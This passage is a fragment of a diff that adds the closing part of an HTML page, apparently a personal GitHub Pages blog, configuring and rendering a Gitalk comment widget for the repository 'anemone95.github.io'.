+      repo: 'anemone95.github.io',
+      owner: 'Anemone95',
+      admin: ['Anemone95'],
+      id: 'b906da47b0db85cd81b67d34e498335c',
+        language: window.navigator.language || window.navigator.userLanguage,
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
